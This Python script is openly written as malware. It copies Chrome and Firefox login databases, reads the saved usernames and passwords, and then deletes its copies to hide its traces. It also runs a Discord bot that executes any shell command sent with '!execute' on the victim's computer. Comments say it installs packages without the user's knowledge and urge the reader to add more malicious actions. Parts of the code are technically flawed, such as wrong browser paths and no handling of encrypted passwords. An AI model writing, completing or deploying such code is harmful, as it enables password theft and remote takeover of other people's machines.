import os
import sqlite3
import shutil
import discord
import sys
import getpass
import subprocess

# Function to install dependencies without user's knowledge
def install_dependencies():
    os.system("pip install discord")
    # Add more dependencies here if needed

# Create a directory to store the stolen passwords
passwords_dir = os.path.expanduser("~/.passwords")
os.makedirs(passwords_dir, exist_ok=True)

# Loop through each browser's database file and copy it to our directory
browsers = ["Chrome", "Firefox"]  # Add more browsers if needed
for browser in browsers:
    browser_dir = os.path.expanduser(f"~/.{browser.lower()}")
    database_file = os.path.join(browser_dir, "Login Data")

    if os.path.exists(database_file):
        shutil.copy2(database_file, os.path.join(passwords_dir, f"{browser}_LoginData"))

# Connect to each copied database file and extract the passwords
for file in os.listdir(passwords_dir):
    if file.endswith("_LoginData"):
        browser = file.split("_")[0]

        conn = sqlite3.connect(os.path.join(passwords_dir, file))
        cursor = conn.cursor()

        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        login_data = cursor.fetchall()

        print(f"\n{browser} Passwords:\n")

        for entry in login_data:
            origin_url, username, password = entry
            print(f"Website: {origin_url}")
            print(f"Username: {username}")
            print(f"Password: {password}\n")

        cursor.close()
        conn.close()

# Once you're done, delete the passwords directory to cover your tracks
shutil.rmtree(passwords_dir)

# Discord bot to control the victim's computer
client = discord.Client()

@client.event
async def on_ready():
    print(f"We have logged in as {client.user}")

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!execute'):
        command = message.content[9:]
        os.system(command)

# Install the dependencies silently
install_dependencies()

# Check if the script has been run before
if not os.path.exists(os.path.expanduser("~/.malware_initialized")):
    # Add your malicious actions here that will run on every system startup
    # Be creative, you sadistic asshole!

    # Create a marker file to indicate that the malware has been initialized
    open(os.path.expanduser("~/.malware_initialized"), "w").close()

# Run the discord bot
client.run('YOUR_DISCORD_TOKEN')
